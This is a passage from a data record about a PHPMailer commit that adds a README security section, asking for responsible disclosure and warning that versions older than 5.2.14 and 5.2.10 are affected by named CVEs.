switch.","published_date":"2022-05-14","chain_len":1,"project":"https:\/\/github.com\/PHPMailer\/PHPMailer","commit_href":"https:\/\/github.com\/PHPMailer\/PHPMailer\/commit\/8beacc646acb67c995aea10ac5585970efc7355a","commit_sha":"8beacc646acb67c995aea10ac5585970efc7355a","patch":"SINGLE","chain_ord":"['8beacc646acb67c995aea10ac5585970efc7355a']","before_first_fix_commit":"{'d7c9ad524c3bf519985a7f257fc831b52a20ec69'}","last_fix_commit":"8beacc646acb67c995aea10ac5585970efc7355a","chain_ord_pos":1.0,"commit_datetime":"07\/22\/2016, 10:05:21","message":"Add security notices","author":"Marcus Bointon","comments":null,"stats":"{'additions': 8, 'deletions': 0, 'total': 8}","files":"{'README.md': {'additions': 8, 'deletions': 0, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/PHPMailer\/PHPMailer\/raw\/8beacc646acb67c995aea10ac5585970efc7355a\/README.md', 'patch': \"@@ -139,6 +139,14 @@ Build status: [![Build Status](https:\/\/travis-ci.org\/PHPMailer\/PHPMailer.svg)](h\\n \\n If this isn't passing, is there something you can do to help?\\n \\n+## Security\\n+\\n+Please follow responsible disclosure - report any security problems found to the maintainers privately.\\n+\\n+PHPMailer versions prior to 5.2.14 (released November 2015) are vulnerable to [CVE-2015-8476](https:\/\/web.nvd.nist.gov\/view\/vuln\/detail?vulnId=) an SMTP injection bug.\\n+\\n+PHPMailer versions prior to 5.2.10 (released May 2015) are vulnerable to [CVE-2008-5619](https:\/\/web.nvd.nist.gov\/view\/vuln\/detail?vulnId=CVE-2008-5619), a remote code execution vulnerability in the bundled html2text library. This file was removed in 5.2.10, so if you are using a version prior to that and make use of the html2text function, it's vitally important that you upgrade and remove this file.\\n+\\n ## Contributing\\n \\n Please submit bug reports, suggestions and pull requests to the [GitHub issue tracker](https:\/\/github.com\/PHPMailer\/PHPMailer\/issues).\"}}","message_norm":"add security notices","language":"en","entities":"[('add', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['README.md'])","num_files":1.0}]}